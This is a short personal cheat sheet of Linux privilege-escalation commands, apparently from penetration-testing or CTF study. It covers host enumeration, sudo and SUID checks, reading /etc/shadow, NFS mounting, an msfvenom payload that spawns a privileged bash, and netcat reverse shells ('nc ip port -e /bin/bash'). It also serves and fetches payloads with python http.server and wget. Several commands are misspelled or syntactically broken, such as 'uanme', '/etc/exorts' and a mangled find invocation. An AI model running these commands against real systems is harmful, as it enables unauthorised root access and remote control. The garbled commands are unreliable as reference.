   linux privilege escalation

      ssh user@ip

      enumeration :
                  uanme -a
                  cat /etc/exorts
                  cat /proc/version
                  cat /etc/hostname
                  cat /etc/crontab
                  history
                  ps -aux
                  confiqure file
                  netstat

      
      sudo missconfiguration : sudo -l
      suid permission : find / -type f -perm -04000/-u=x/-u+s,-perm -04000/-g=x/-g+s -ls 2>/dev/null
      read/write permission : ls -la /etc/shadow/paswwd
      nfs : showmount -e ip
      nfs : mount -o rw,vers=3 ip:/folder /tpm/folder
      capabilities : getcap -r / 2>/dev/null
      msfvenom -p linux/x64/exec CMD="/bin/bash -p" -f elf>shel.elf
      nc -lvnp 9000<file.txt
      reverse shell : nc ip port>file.txt
      nc -lvnp 9000
      reverse shell : nc ip port -e /bin/bash
      scp file username@ip /destination folder
      python -m http.server 9000
      wget ip/file
      linpeas
      website : gtfobin
